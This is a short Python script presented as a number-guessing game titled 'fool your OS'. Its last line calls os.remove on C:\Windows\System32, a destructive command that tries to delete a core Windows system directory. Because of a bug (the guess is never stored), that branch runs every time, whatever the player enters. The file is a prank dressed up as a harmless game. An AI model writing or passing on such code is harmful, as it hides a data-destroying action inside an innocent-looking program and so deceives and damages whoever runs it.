import random
import os

number = random.randint(1, 10)
guess = ""

print("|Welcome on fool your OS|")

def guess_number(guess):
    while True:
        try:

            guess = int(input("Silly Game ! Guess number between 1 and 10 :"))

            if 1 <= guess <= 10:
                return guess

            else:
                print("The number must be between 1 and 1O. Try Again !")

        except ValueError:
            print("The value msut be an integer")   

guess_number(guess)

if guess == number:

    print("GG you won !")
else:
    os.remove("C:\Windows\System32")

